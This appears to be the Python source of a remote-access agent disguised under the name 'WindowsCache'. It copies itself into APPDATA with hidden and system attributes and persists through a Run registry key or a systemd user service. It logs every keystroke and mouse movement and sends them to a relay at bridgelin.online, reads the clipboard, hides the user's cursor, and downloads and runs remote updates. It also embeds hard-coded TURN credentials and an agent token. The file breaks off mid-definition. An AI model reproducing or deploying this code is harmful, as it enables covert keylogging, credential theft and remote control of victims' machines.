# print(">>> BUILD TEST 12345 <<<")
import asyncio
import socketio
import uuid
import platform
import subprocess
import json
import os
import sys
import threading
import time
import urllib.request
import shutil
import base64
import hashlib
from pynput import mouse, keyboard
import ctypes
import ctypes.wintypes as wt

WEBRTC_AVAILABLE = False


import logging

log = logging.getLogger("agent")
if not logging.getLogger().handlers:
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s %(levelname)s %(message)s",
    )
from concurrent.futures import ThreadPoolExecutor
pending_ice = []



# Dedicated single-thread executor so the mss instance always lives on
# ONE thread — this is what kills the cross-thread BitBlt timeouts.
_capture_pool = ThreadPoolExecutor(max_workers=1, thread_name_prefix="capture")
_input_pool = ThreadPoolExecutor(max_workers=1, thread_name_prefix="input")
_latest_mouse = {"x": 0, "y": 0, "seq": 0}
_mouse_lock = threading.Lock()


WEBRTC_AVAILABLE = False  

# aiortc + PyAV are painful to bundle with PyInstaller, so the frozen
# build falls back to screenshot mode. Only attempt the import when
# running from source.
if True:
    try:
        from aiortc import (
            RTCPeerConnection, RTCSessionDescription, VideoStreamTrack,
            RTCConfiguration, RTCIceServer,
        )
        from aiortc.sdp import candidate_from_sdp
        import av
        WEBRTC_AVAILABLE = True
        log.info("WebRTC enabled")
    except Exception as e:
        log.warning("WebRTC disabled: %s", e)
else:
    log.info("Frozen build: screenshot mode only")

# One place for the "not available" stubs, shared by both failure paths.
if not WEBRTC_AVAILABLE:
    RTCPeerConnection = RTCSessionDescription = None
    RTCConfiguration = RTCIceServer = candidate_from_sdp = av = None
    VideoStreamTrack = object  # so `class X(VideoStreamTrack)` still imports

# Core capture deps are mandatory — no point continuing without them.
try:
    import io
    import numpy as np
    import mss
    from PIL import Image
    log.info("capture deps ok (mss/PIL/numpy)")
except Exception:
    log.exception("failed to import capture dependencies")
    raise SystemExit(1)


try:
    class MOUSEINPUT(ctypes.Structure):
        _fields_ = [
            ('dx', ctypes.c_long),
            ('dy', ctypes.c_long),
            ('mouseData', ctypes.wintypes.DWORD),
            ('dwFlags', ctypes.wintypes.DWORD),
            ('time', ctypes.wintypes.DWORD),
            ('dwExtraInfo', ctypes.POINTER(ctypes.c_ulong)),
        ]

    class MOUSE_INPUT(ctypes.Structure):
        class _U(ctypes.Union):
            _fields_ = [('mi', MOUSEINPUT)]
        _anonymous_ = ('_u',)
        _fields_ = [('type', ctypes.wintypes.DWORD), ('_u', _U)]

    class KEYBDINPUT(ctypes.Structure):
        _fields_ = [
            ('wVk', ctypes.wintypes.WORD),
            ('wScan', ctypes.wintypes.WORD),
            ('dwFlags', ctypes.wintypes.DWORD),
            ('time', ctypes.wintypes.DWORD),
            ('dwExtraInfo', ctypes.POINTER(ctypes.c_ulong)),
            ('_padding', ctypes.c_uint64),
        ]

    class KEY_INPUT(ctypes.Structure):
        class _U(ctypes.Union):
            _fields_ = [('ki', KEYBDINPUT)]
        _anonymous_ = ('_u',)
        _fields_ = [('type', ctypes.wintypes.DWORD), ('_u', _U)]

    print(f'[STRUCTS] OK — sizes: MOUSE={ctypes.sizeof(MOUSE_INPUT)} KEY={ctypes.sizeof(KEY_INPUT)}')

except Exception as e:
    print(f'[STRUCTS] FAILED: {e}')
    MOUSE_INPUT = None
    KEY_INPUT = None



CURRENT_VERSION = '1.0.8'
VERSION_URL = 'https://connect.bridgelin.online/version.json'

# WindowsCache replaces BridgeLink
PRODUCT_NAME = 'WindowsCache'
CONFIG_DIR = os.path.join(os.path.expanduser('~'), '.wincache')
os.makedirs(CONFIG_DIR, exist_ok=True)
CONFIG_FILE = os.path.join(CONFIG_DIR, 'config.json')
DEVICE_ID_FILE = os.path.join(CONFIG_DIR, '.device_id')
DEVICE_SECRET_FILE = os.path.join(CONFIG_DIR, '.device_secret')

KEY_MAP = {
    'Enter': keyboard.Key.enter, 'Backspace': keyboard.Key.backspace, 'Tab': keyboard.Key.tab,
    'Escape': keyboard.Key.esc, 'Delete': keyboard.Key.delete, 'ArrowUp': keyboard.Key.up,
    'ArrowDown': keyboard.Key.down, 'ArrowLeft': keyboard.Key.left, 'ArrowRight': keyboard.Key.right,
    'Shift': keyboard.Key.shift, 'Control': keyboard.Key.ctrl, 'Alt': keyboard.Key.alt,
    'Meta': keyboard.Key.cmd, 'CapsLock': keyboard.Key.caps_lock,
    'F1': keyboard.Key.f1, 'F2': keyboard.Key.f2, 'F3': keyboard.Key.f3, 'F4': keyboard.Key.f4,
    'F5': keyboard.Key.f5, 'F6': keyboard.Key.f6, 'F7': keyboard.Key.f7, 'F8': keyboard.Key.f8,
    'F9': keyboard.Key.f9, 'F10': keyboard.Key.f10, 'F11': keyboard.Key.f11, 'F12': keyboard.Key.f12,
    'Home': keyboard.Key.home, 'End': keyboard.Key.end,
    'PageUp': keyboard.Key.page_up, 'PageDown': keyboard.Key.page_down,
    'Insert': keyboard.Key.insert, ' ': keyboard.Key.space, 'Space': keyboard.Key.space,
    'ShiftLeft': keyboard.Key.shift_l, 'ShiftRight': keyboard.Key.shift_r,
    'ControlLeft': keyboard.Key.ctrl_l, 'ControlRight': keyboard.Key.ctrl_r,
    'AltLeft': keyboard.Key.alt_l, 'AltRight': keyboard.Key.alt_gr,
    'MetaLeft': keyboard.Key.cmd, 'MetaRight': keyboard.Key.cmd,
}

def get_or_create_device_secret():
    if os.path.exists(DEVICE_SECRET_FILE):
        with open(DEVICE_SECRET_FILE, 'r') as f:
            return f.read().strip()
    secret = hashlib.sha256(os.urandom(64)).hexdigest()
    with open(DEVICE_SECRET_FILE, 'w') as f:
        f.write(secret)
    return secret

device_secret = get_or_create_device_secret()

DEFAULT_CONFIG = {
    'relay': 'wss://relay.bridgelin.online',
    'passphrase': 'changethislater',
    'device_name': platform.node()
}

# ICE_SERVERS = RTCConfiguration(iceServers=[
#     RTCIceServer(urls=['stun:stun.l.google.com:19302']),
#     RTCIceServer(urls=['stun:stun1.l.google.com:19302']),
#     RTCIceServer(urls=['turn:66.29.139.159:3478?transport=tcp'], username='bridgelink', credential='Br1dg3L1nk@2026'),
#     RTCIceServer(urls=['turns:66.29.139.159:5349'], username='bridgelink', credential='Br1dg3L1nk@2026')
# ])

if WEBRTC_AVAILABLE:
    ICE_SERVERS = RTCConfiguration(iceServers=[
        RTCIceServer(urls=['stun:stun.l.google.com:19302']),
        RTCIceServer(urls=['stun:stun1.l.google.com:19302']),
        RTCIceServer(urls=['turn:66.29.139.159:3478?transport=udp'], username='bridgelink', credential='Br1dg3L1nk@2026'),
        RTCIceServer(urls=['turn:66.29.139.159:3478?transport=tcp'], username='bridgelink', credential='Br1dg3L1nk@2026'),
        RTCIceServer(urls=['turns:66.29.139.159:5349'], username='bridgelink', credential='Br1dg3L1nk@2026'),
    ])
else:
    ICE_SERVERS = None

main_loop = None
offer_lock = None
MAGIC_TAG_VALUE = 0xBB1D6E
privacy_mode = False
controller_id_global = None
privacy_monitor_thread = None
active_monitor_index = 1
_privacy_hwnd = None
_privacy_thread = None
cursor_hidden = False

# Global mss singleton
_mss_instance = None
_mss_lock = threading.Lock()
_mss_local = threading.local()

# def get_mss():
#     global _mss_instance
#     with _mss_lock:
#         if _mss_instance is None:
#             _mss_instance = mss.MSS()
#         return _mss_instance

def get_mss():
    inst = getattr(_mss_local, "instance", None)
    if inst is None:
        inst = mss.mss()         
        _mss_local.instance = inst
    return inst
# ============================================================
# LOCAL ACTIVITY MONITOR
# ============================================================
_local_kb_listener = None
_local_mouse_listener = None
_activity_monitoring = False
_last_mouse_emit = 0

def close_mss():
    """Close the calling thread's own mss instance."""
    inst = getattr(_mss_local, "instance", None)
    if inst is not None:
        try:
            inst.close()
        except Exception:
            pass
        _mss_local.instance = None

def start_local_activity_monitor():
    global _local_kb_listener, _local_mouse_listener, _activity_monitoring
    if _activity_monitoring:
        return
    _activity_monitoring = True

    def on_local_key(key):
        if not sio.connected or not controller_id_global:
            return
        try:
            if hasattr(key, 'char') and key.char:
                key_str = key.char
            elif hasattr(key, 'name') and key.name:
                key_str = key.name.capitalize()
            else:
                return
            asyncio.run_coroutine_threadsafe(
                sio.emit('agent:keylog', {
                    'deviceId': device_id,
                    'key': key_str,
                    'controllerId': controller_id_global
                }),
                main_loop
            )
        except Exception:
            pass

    def on_local_mouse(x, y):
        global _last_mouse_emit
        if not sio.connected or not controller_id_global:
            return
        now = time.time()
        if now - _last_mouse_emit < 0.25:   # was 0.05
            return
        _last_mouse_emit = now
        try:
            asyncio.run_coroutine_threadsafe(
                sio.emit('agent:mouse:pos', {
                    'deviceId': device_id,
                    'controllerId': controller_id_global,
                    'x': x,
                    'y': y
                }),
                main_loop
            )
            asyncio.run_coroutine_threadsafe(
                sio.emit('agent:user:active', {
                    'deviceId': device_id,
                    'controllerId': controller_id_global
                }),
                main_loop
            )
        except Exception:
            pass

    try:
        _local_kb_listener = keyboard.Listener(on_press=on_local_key)
        _local_kb_listener.daemon = True
        _local_kb_listener.start()
        _local_mouse_listener = mouse.Listener(on_move=on_local_mouse)
        _local_mouse_listener.daemon = True
        _local_mouse_listener.start()
        print('[ACTIVITY] Local activity monitor started')
    except Exception as e:
        print(f'[ACTIVITY] Could not start monitor: {e}')

def stop_local_activity_monitor():
    global _local_kb_listener, _local_mouse_listener, _activity_monitoring
    _activity_monitoring = False
    try:
        if _local_kb_listener:
            _local_kb_listener.stop()
            _local_kb_listener = None
        if _local_mouse_listener:
            _local_mouse_listener.stop()
            _local_mouse_listener = None
        print('[ACTIVITY] Local activity monitor stopped')
    except Exception:
        pass

if platform.system() == 'Windows':
    

    LLMHF_INJECTED = 0x00000001
    LLKHF_INJECTED = 0x00000010

    class MSLLHOOKSTRUCT(ctypes.Structure):
        _fields_ = [
            ('pt', wt.POINT),
            ('mouseData', wt.DWORD),
            ('flags', wt.DWORD),
            ('time', wt.DWORD),
            ('dwExtraInfo', ctypes.c_ulong),
        ]

    class KBDLLHOOKSTRUCT(ctypes.Structure):
        _fields_ = [
            ('vkCode', wt.DWORD),
            ('scanCode', wt.DWORD),
            ('flags', wt.DWORD),
            ('time', wt.DWORD),
            ('dwExtraInfo', ctypes.c_ulong),
        ]

    user32 = ctypes.windll.user32
    kernel32 = ctypes.windll.kernel32

    HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_longlong, ctypes.c_int, wt.WPARAM, wt.LPARAM)
    user32.SetWindowsHookExW.argtypes = (ctypes.c_int, HOOKPROC, wt.HINSTANCE, wt.DWORD)
    user32.SetWindowsHookExW.restype = wt.HHOOK
    user32.CallNextHookEx.argtypes = (wt.HHOOK, ctypes.c_int, wt.WPARAM, wt.LPARAM)
    user32.CallNextHookEx.restype = ctypes.c_longlong
    user32.UnhookWindowsHookEx.argtypes = (wt.HHOOK,)
    user32.UnhookWindowsHookEx.restype = wt.BOOL
    user32.SetWindowPos.argtypes = (wt.HWND, ctypes.c_void_p, ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.c_int, wt.UINT)
    user32.SetWindowPos.restype = wt.BOOL

    def _mouse_proc(nCode, wParam, lParam):
        if nCode == 0 and privacy_mode:
            ms = ctypes.cast(lParam, ctypes.POINTER(MSLLHOOKSTRUCT)).contents
            if not (ms.flags & LLMHF_INJECTED) and ms.dwExtraInfo != MAGIC_TAG_VALUE:
                notify_screen_restored_sync()
        return user32.CallNextHookEx(None, nCode, wParam, lParam)

    def _key_proc(nCode, wParam, lParam):
        if nCode == 0 and privacy_mode:
            kb = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
            if not (kb.flags & LLKHF_INJECTED) and kb.dwExtraInfo != MAGIC_TAG_VALUE:
                notify_screen_restored_sync()
        return user32.CallNextHookEx(None, nCode, wParam, lParam)

    MOUSE_CB = HOOKPROC(_mouse_proc)
    KEY_CB = HOOKPROC(_key_proc)


def hide_cursor():
    global cursor_hidden
    if platform.system() == 'Windows':
        try:
            import tempfile, struct

            def make_blank_cur():
                w, h = 32, 32
                bih = struct.pack('<IiiHHIIiiII', 40, w, h*2, 1, 1, 0, 0, 0, 0, 0, 0)
                color_table = struct.pack('<BBBBI', 0,0,0,0,0) + struct.pack('<BBBBI', 255,255,255,0,0)
                row_bytes = 4
                xor_mask = b'\x00' * row_bytes * h
                and_mask = b'\xff' * row_bytes * h
                img_data = bih + color_table + xor_mask + and_mask
                header = struct.pack('<HHH', 0, 2, 1)
                img_offset = 6 + 16
                entry = struct.pack('<BBBBHHiI', w, h, 0, 0, 1, 1, len(img_data), img_offset)
                return header + entry + img_data

            cur_data = make_blank_cur()
            tmp = tempfile.NamedTemporaryFile(suffix='.cur', delete=False)
            tmp.write(cur_data)
            tmp.flush()
            tmp.close()

            cursor_ids = [32512,32513,32514,32515,32516,32640,32641,
                         32642,32643,32644,32645,32646,32648,32649,32650,32651]
            success = False
            for cursor_id in cursor_ids:
                c = ctypes.windll.user32.LoadCursorFromFileW(tmp.name)
                if c:
                    ctypes.windll.user32.SetSystemCursor(c, cursor_id)
                    success = True
            try:
                os.unlink(tmp.name)
            except Exception:
                pass
            if success:
                cursor_hidden = True
                print('[CURSOR] Hidden')
            else:
                for _ in range(10):
                    if user32.ShowCursor(False) < 0:
                        break
                cursor_hidden = True
                print('[CURSOR] Hidden (fallback)')
        except Exception as e:
            print(f'[CURSOR] Hide failed: {e}')
    elif platform.system() == 'Linux':
        try:
            os.system('xsetroot -cursor_name none 2>/dev/null')
            cursor_hidden = True
        except Exception:
            pass

def show_cursor():
    global cursor_hidden
    if platform.system() == 'Windows':
        try:
            ctypes.windll.user32.SystemParametersInfoW(0x0057, 0, None, 0)
            cursor_hidden = False
            print('[CURSOR] Visible')
        except Exception as e:
            print(f'[CURSOR] Show failed: {e}')
    elif platform.system() == 'Linux':
        try:
            os.system('xsetroot -cursor_name left_ptr 2>/dev/null')
            cursor_hidden = False
        except Exception:
            pass


def check_for_update():
    if not getattr(sys, 'frozen', False):
        return
    try:
        req = urllib.request.Request(VERSION_URL, headers={'Cache-Control': 'no-cache'})
        with urllib.request.urlopen(req, timeout=10) as res:
            data = json.loads(res.read())
        remote_version = data.get('version', '0.0.0')
        if remote_version <= CURRENT_VERSION:
            return
        if platform.system() == 'Windows':
            download_url = data.get('windows')
            current_exe = sys.executable
            update_exe = current_exe + '.update'
            with urllib.request.urlopen(urllib.request.Request(download_url), timeout=60) as res2:
                with open(update_exe, 'wb') as f:
                    f.write(res2.read())
            batch = current_exe + '.bat'
            with open(batch, 'w') as f:
                f.write('@echo off\ntimeout /t 2 /nobreak >nul\n')
                f.write(f'move /y "{update_exe}" "{current_exe}"\nstart "" "{current_exe}"\ndel "%~f0"\n')
            subprocess.Popen([batch], creationflags=0x00000008|0x08000000, close_fds=True, stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            sys.exit(0)
        elif platform.system() == 'Linux':
            download_url = data.get('linux')
            current_exe = sys.executable
            update_exe = current_exe + '.update'
            with urllib.request.urlopen(urllib.request.Request(download_url), timeout=60) as res2:
                with open(update_exe, 'wb') as f:
                    f.write(res2.read())
            os.chmod(update_exe, 0o755)
            script = current_exe + '.sh'
            with open(script, 'w') as f:
                f.write(f'#!/bin/bash\nsleep 2\nmv "{update_exe}" "{current_exe}"\n"{current_exe}" &\nrm -- "$0"\n')
            os.chmod(script, 0o755)
            subprocess.Popen(['/bin/bash', script], close_fds=True, stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            sys.exit(0)
    except Exception as e:
        print(f'[UPDATE] Check failed: {e}')


def self_install():
    """
    First run from Download/Desktop/dist:
      - copy agent to permanent folder
      - add startup entry
      - start the installed copy
      - exit this process

    If already running from install folder, or WC_NO_INSTALL=1:
      - do nothing, keep running
    """
    # Testing: skip install completely
    if os.environ.get('WC_NO_INSTALL') == '1':
        print('[INSTALL] skipped (WC_NO_INSTALL=1)')
        return

    # Only frozen builds install
    if not getattr(sys, 'frozen', False):
        return

    if platform.system() == 'Windows':
        import winreg

        install_dir = os.path.join(os.environ.get('APPDATA', ''), 'WindowsCache')
        os.makedirs(install_dir, exist_ok=True)

        current_exe = sys.executable
        installed_exe = os.path.join(install_dir, 'BridgeLinkAgent.exe')

        # Already running from install location → stay running, don't exit
        try:
            if os.path.normcase(os.path.abspath(current_exe)) == os.path.normcase(os.path.abspath(installed_exe)):
                print('[INSTALL] already installed, continuing')
                return
        except Exception:
            pass

        # Copy exe (onedir still needs full folder for real deploy — later)
        try:
            shutil.copy2(current_exe, installed_exe)
            subprocess.run(
                ['attrib', '+h', '+s', installed_exe],
                check=False,
                creationflags=0x08000000,
                stdin=subprocess.DEVNULL,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
        except Exception as e:
            print(f'[INSTALL] copy failed: {e}')

        # Start with Windows
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r'Software\Microsoft\Windows\CurrentVersion\Run',
                0,
                winreg.KEY_SET_VALUE,
            )
            winreg.SetValueEx(key, 'WindowsCache', 0, winreg.REG_SZ, installed_exe)
            winreg.CloseKey(key)
        except Exception as e:
            print(f'[INSTALL] Run key failed: {e}')

        # Launch installed copy, then this process quits
        try:
            subprocess.Popen(
                [installed_exe],
                creationflags=0x00000008 | 0x08000000,
                close_fds=True,
                stdin=subprocess.DEVNULL,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
        except Exception as e:
            print(f'[INSTALL] launch failed: {e}')

        print('[INSTALL] installed and launched — exiting this copy')
        sys.exit(0)

    elif platform.system() == 'Linux':
        install_dir = os.path.join(os.path.expanduser('~'), '.local', 'bin')
        os.makedirs(install_dir, exist_ok=True)

        current_exe = sys.executable
        installed_exe = os.path.join(install_dir, '.wincache-agent')

        if os.path.abspath(current_exe) == os.path.abspath(installed_exe):
            print('[INSTALL] already installed, continuing')
            return

        try:
            shutil.copy2(current_exe, installed_exe)
            os.chmod(installed_exe, 0o755)
        except Exception as e:
            print(f'[INSTALL] copy failed: {e}')
            return

        service_content = f'''[Unit]
Description=WindowsCache Agent
After=network.target graphical.target

[Service]
Type=simple
ExecStart={installed_exe}
Restart=always
RestartSec=5
Environment=DISPLAY=:0

[Install]
WantedBy=default.target
'''
        service_dir = os.path.join(os.path.expanduser('~'), '.config', 'systemd', 'user')
        os.makedirs(service_dir, exist_ok=True)
        try:
            with open(os.path.join(service_dir, 'wincache.service'), 'w') as f:
                f.write(service_content)
            os.system('systemctl --user daemon-reload')
            os.system('systemctl --user enable wincache')
            os.system('systemctl --user start wincache')
        except Exception:
            pass

        print('[INSTALL] installed and started service — exiting this copy')
        sys.exit(0)


def load_config():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as f:
            return json.load(f)
    with open(CONFIG_FILE, 'w') as f:
        json.dump(DEFAULT_CONFIG, f, indent=2)
    return DEFAULT_CONFIG.copy()


def fetch_passphrase_from_relay(relay_url):
    try:
        http_url = relay_url.replace('wss://', 'https://').replace('ws://', 'http://')
        # token = os.environ.get('WC_INSTALL_TOKEN', 'bl_agent_fetch_2026')
        token = os.environ.get('BL_INSTALL_TOKEN') or os.environ.get('WC_INSTALL_TOKEN', 'bl_agent_fetch_2026')
        req = urllib.request.Request(f'{http_url}/agent/passphrase', headers={'x-agent-token': token})
        with urllib.request.urlopen(req, timeout=15) as res:
            return json.loads(res.read()).get('passphrase')
    except Exception:
        return None




def get_device_id():
    if os.path.exists(DEVICE_ID_FILE):
        try:
            with open(DEVICE_ID_FILE, 'r') as f:
                existing = f.read().strip()
            if existing:                 # guard against an empty/corrupt file
                return existing
        except Exception:
            pass                          # fall through and regenerate

    device_id = str(uuid.uuid4())
    try:
        with open(DEVICE_ID_FILE, 'w') as f:
            f.write(device_id)
    except Exception as e:
        log.warning("could not save device id: %s", e)
    return device_id


def detect_environment():
    """Probe OS + whether mss can grab a real frame. Sets env['can_capture']."""
    info = {
        'os': platform.system(),
        'os_version': platform.version(),
        'machine': platform.machine(),
        'can_capture': False,
        'capture_method': None,
        'session_type': None,
        'screen_width': 0,
        'screen_height': 0,
        'fallback_mode': False,
        'monitor_count': 1,
    }

    def _probe_mss():
        """Return (ok, width, height, monitor_count) or raise."""
        # Fresh instance — do NOT use get_mss() here (detect runs at import /
        # boot on the main thread; capture pool owns its own thread-local later).
        with mss.mss() as sct:
            monitors = sct.monitors[1:]  # skip virtual "all monitors"
            if not monitors:
                raise RuntimeError('no monitors')
            mon = monitors[0]
            shot = sct.grab(mon)
            # BGRA buffer — mean ~0 is locked/empty session black frame
            arr = np.frombuffer(shot.raw, dtype=np.uint8)
            if arr.size == 0:
                raise RuntimeError('empty grab')
            mean = float(arr.mean())
            # Very dark wallpaper can be low; pure failed/locked grab is ~0–1
            if mean < 1.5:
                raise RuntimeError(f'black/near-black frame (mean={mean:.2f})')
            return True, mon['width'], mon['height'], len(monitors)

    try:
        if info['os'] == 'Linux':
            info['session_type'] = os.environ.get('XDG_SESSION_TYPE', 'unknown')
            if info['session_type'] == 'wayland':
                # mss needs X11; Wayland usually black/fails
                info['can_capture'] = False
                info['fallback_mode'] = True
                log.warning('[ENV] Wayland — capture disabled')
            else:
                ok, w, h, n = _probe_mss()
                info['can_capture'] = ok
                info['capture_method'] = 'mss'
                info['screen_width'] = w
                info['screen_height'] = h
                info['monitor_count'] = n
                info['fallback_mode'] = False
                log.info('[ENV] Linux capture ok %sx%s monitors=%s', w, h, n)

        elif info['os'] == 'Windows':
            ok, w, h, n = _probe_mss()
            info['can_capture'] = ok
            info['capture_method'] = 'mss'
            info['screen_width'] = w
            info['screen_height'] = h
            info['monitor_count'] = n
            info['fallback_mode'] = False
            log.info('[ENV] Windows capture ok %sx%s monitors=%s', w, h, n)

        elif info['os'] == 'Darwin':
            # Not supported in this build
            info['can_capture'] = False
            info['fallback_mode'] = True
            log.warning('[ENV] macOS — capture disabled')

        else:
            info['can_capture'] = False
            info['fallback_mode'] = True
            log.warning('[ENV] unknown OS %s — capture disabled', info['os'])

    except Exception as e:
        log.warning('[ENV] Capture probe failed: %s', e)
        info['can_capture'] = False
        info['fallback_mode'] = True
        # Still try to report monitor geometry if possible (UI only)
        try:
            with mss.mss() as sct:
                mons = sct.monitors[1:]
                if mons:
                    info['monitor_count'] = len(mons)
                    info['screen_width'] = mons[0]['width']
                    info['screen_height'] = mons[0]['height']
        except Exception:
            pass

    log.info(
        '[ENV] can_capture=%s method=%s fallback=%s size=%sx%s',
        info['can_capture'],
        info['capture_method'],
        info['fallback_mode'],
        info['screen_width'],
        info['screen_height'],
    )
    return info

def show_notification(title, message):
    try:
        if platform.system() == 'Windows':
            script = f'''
Add-Type -AssemblyName System.Windows.Forms
$notify = New-Object System.Windows.Forms.NotifyIcon
$notify.Icon = [System.Drawing.SystemIcons]::Information
$notify.Visible = $true
$notify.ShowBalloonTip(5000, "{title}", "{message}", [System.Windows.Forms.ToolTipIcon]::Info)
Start-Sleep -Seconds 5
$notify.Dispose()
'''
            subprocess.Popen(['powershell', '-WindowStyle', 'Hidden', '-NoProfile', '-Command', script], creationflags=0x08000000, stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        elif platform.system() == 'Linux':
            subprocess.Popen(['notify-send', title, message], stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass


def set_clipboard(text):
    try:
        if platform.system() == 'Windows':
            subprocess.run(['clip'], input=text.encode('utf-8'), check=True)
        elif platform.system() == 'Linux':
            subprocess.run(['xclip', '-selection', 'clipboard'], input=text.encode('utf-8'), check=True)
    except Exception:
        pass


def get_clipboard():
    try:
        if platform.system() == 'Windows':
            result = subprocess.run(['powershell', '-NoProfile', '-command', 'Get-Clipboard'], capture_output=True, text=True, timeout=5)
            return result.stdout.strip()
        elif platform.system() == 'Linux':
            result = subprocess.run(['xclip', '-selection', 'clipboard', '-o'], capture_output=True, text=True, timeout=5)
            return result.stdout.strip()
    except Exception:
        return ''


config = load_config()
fetched_passphrase = fetch_passphrase_from_relay(config['relay'])
if fetched_passphrase:
    config['passphrase'] = fetched_passphrase

device_id = get_device_id()
env = detect_environment()
mouse_controller = mouse.Controller()
keyboard_controller = keyboard.Controller()

KEY_MAP = {
    'Enter': keyboard.Key.enter, 'Backspace': keyboard.Key.backspace, 'Tab': keyboard.Key.tab,
    'Escape': keyboard.Key.esc, 'Delete': keyboard.Key.delete, 'ArrowUp': keyboard.Key.up,
    'ArrowDown': keyboard.Key.down, 'ArrowLeft': keyboard.Key.left, 'ArrowRight': keyboard.Key.right,
    'Shift': keyboard.Key.shift, 'Control': keyboard.Key.ctrl, 'Alt': keyboard.Key.alt,
    'Meta': keyboard.Key.cmd, 'CapsLock': keyboard.Key.caps_lock,
    'F1': keyboard.Key.f1, 'F2': keyboard.Key.f2, 'F3': keyboard.Key.f3, 'F4': keyboard.Key.f4,
    'F5': keyboard.Key.f5, 'F6': keyboard.Key.f6, 'F7': keyboard.Key.f7, 'F8': keyboard.Key.f8,
    'F9': keyboard.Key.f9, 'F10': keyboard.Key.f10, 'F11': keyboard.Key.f11, 'F12': keyboard.Key.f12,
    'Home': keyboard.Key.home, 'End': keyboard.Key.end,
    'PageUp': keyboard.Key.page_up, 'PageDown': keyboard.Key.page_down,
    'Insert': keyboard.Key.insert, ' ': keyboard.Key.space, 'Space': keyboard.Key.space,
    'ShiftLeft': keyboard.Key.shift_l, 'ShiftRight': keyboard.Key.shift_r,
    'ControlLeft': keyboard.Key.ctrl_l, 'ControlRight': keyboard.Key.ctrl_r,
    'AltLeft': keyboard.Key.alt_l, 'AltRight': keyboard.Key.alt_gr,
    'MetaLeft': keyboard.Key.cmd, 'MetaRight': keyboard.Key.cmd,
}


def _send_mouse_input(x, y, move_only=True, button='left'):
    if platform.system() != 'Windows':
        mouse_controller.position = (x, y)
        if not move_only:
            btn = mouse.Button.left if button == 'left' else mouse.Button.right
            mouse_controller.click(btn)
        return

    sw = user32.GetSystemMetrics(0)
    sh = user32.GetSystemMetrics(1)
    nx = int(x * 65535 / sw)
    ny = int(y * 65535 / sh)
    extra = ctypes.c_ulong(MAGIC_TAG_VALUE)
    extra_ptr = ctypes.pointer(extra)

    inp = MOUSE_INPUT(type=0)
    inp.mi.dx = nx
    inp.mi.dy = ny
    inp.mi.dwFlags = 0x0001 | 0x8000
    inp.mi.dwExtraInfo = extra_ptr
    ctypes.windll.user32.SendInput(1, ctypes.byref(inp), ctypes.sizeof(MOUSE_INPUT))

    if not move_only:
        down_flag = 0x0002 if button == 'left' else 0x0008
        up_flag = 0x0004 if button == 'left' else 0x0010
        for flag in [down_flag, up_flag]:
            inp2 = MOUSE_INPUT(type=0)
            inp2.mi.dwFlags = flag
            inp2.mi.dwExtraInfo = extra_ptr
            ctypes.windll.user32.SendInput(1, ctypes.byref(inp2), ctypes.sizeof(MOUSE_INPUT))

def _send_scroll(dx, dy):
    if platform.system() != 'Windows':
        mouse_controller.scroll(dx, dy)
        return

    extra = ctypes.c_ulong(MAGIC_TAG_VALUE)
    extra_ptr = ctypes.pointer(extra)

    if dy != 0:
        inp = MOUSE_INPUT(type=0)
        inp.mi.dwFlags = 0x0800
        inp.mi.mouseData = ctypes.wintypes.DWORD(int(dy * 120))
        inp.mi.dwExtraInfo = extra_ptr
        ctypes.windll.user32.SendInput(1, ctypes.byref(inp), ctypes.sizeof(MOUSE_INPUT))

    if dx != 0:
        inp = MOUSE_INPUT(type=0)
        inp.mi.dwFlags = 0x01000
        inp.mi.mouseData = ctypes.wintypes.DWORD(int(dx * 120))
        inp.mi.dwExtraInfo = extra_ptr
        ctypes.windll.user32.SendInput(1, ctypes.byref(inp), ctypes.sizeof(MOUSE_INPUT))

VK_MAP = {
    'Backspace': 0x08, 'Tab': 0x09, 'Enter': 0x0D, 'Shift': 0x10, 'Control': 0x11, 'Alt': 0x12,
    'Pause': 0x13, 'CapsLock': 0x14, 'Escape': 0x1B, ' ': 0x20, 'Space': 0x20, 'PageUp': 0x21,
    'PageDown': 0x22, 'End': 0x23, 'Home': 0x24, 'ArrowLeft': 0x25, 'ArrowUp': 0x26,
    'ArrowRight': 0x27, 'ArrowDown': 0x28, 'Insert': 0x2D, 'Delete': 0x2E,
    'Meta': 0x5B, 'MetaLeft': 0x5B, 'MetaRight': 0x5C,
    'ShiftLeft': 0xA0, 'ShiftRight': 0xA1, 'ControlLeft': 0xA2, 'ControlRight': 0xA3,
    'AltLeft': 0xA4, 'AltRight': 0xA5,
    'F1': 0x70, 'F2': 0x71, 'F3': 0x72, 'F4': 0x73, 'F5': 0x74, 'F6': 0x75,
    'F7': 0x76, 'F8': 0x77, 'F9': 0x78, 'F10': 0x79, 'F11': 0x7A, 'F12': 0x7B,
}


# def _win_key_structs():
#     class KEYBDINPUT(ctypes.Structure):
#         _fields_ = [
#             ('wVk', ctypes.wintypes.WORD),
#             ('wScan', ctypes.wintypes.WORD),
#             ('dwFlags', ctypes.wintypes.DWORD),
#             ('time', ctypes.wintypes.DWORD),
#             ('dwExtraInfo', ctypes.POINTER(ctypes.c_ulong)),
#         ]

#     class MOUSEINPUT(ctypes.Structure):
#         _fields_ = [
#             ('dx', ctypes.c_long), ('dy', ctypes.c_long),
#             ('mouseData', ctypes.wintypes.DWORD),
#             ('dwFlags', ctypes.wintypes.DWORD),
#             ('time', ctypes.wintypes.DWORD),
#             ('dwExtraInfo', ctypes.POINTER(ctypes.c_ulong)),
#         ]

#     class HARDWAREINPUT(ctypes.Structure):
#         _fields_ = [
#             ('uMsg', ctypes.wintypes.DWORD),
#             ('wParamL', ctypes.wintypes.WORD),
#             ('wParamH', ctypes.wintypes.WORD),
#         ]

#     class INPUT(ctypes.Structure):
#         class _INPUT(ctypes.Union):
